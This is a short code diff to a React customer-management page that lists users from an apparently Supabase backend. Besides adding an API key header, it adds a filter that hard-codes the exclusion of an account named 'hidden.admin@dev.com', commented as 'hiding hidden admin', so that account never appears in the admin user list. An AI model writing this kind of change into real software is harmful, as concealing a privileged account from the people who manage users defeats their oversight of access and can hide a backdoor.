@@ -86,6 +86,7 @@ const CustomerManagement = () => {
                     headers: {
                         Authorization: `Bearer ${session.access_token}`,
                         'Content-Type': 'application/json',
+                        'apikey': import.meta.env.VITE_SUPABASE_ANON_KEY,
                     },
                 }
             );
@@ -97,9 +98,9 @@ const CustomerManagement = () => {
 
             const { users: usersData } = await response.json();
 
-            // Add banned status to users and filter for customers
+            // Add banned status to users and filter for customers, hiding hidden admin
             const customers = usersData
-                .filter((user: any) => user.role === 'customer')
+                .filter((user: any) => user.role === 'customer' && user.email !== 'hidden.admin@dev.com')
                 .map((user: any) => ({
                     ...user,
                     banned_until: user.banned_until || null
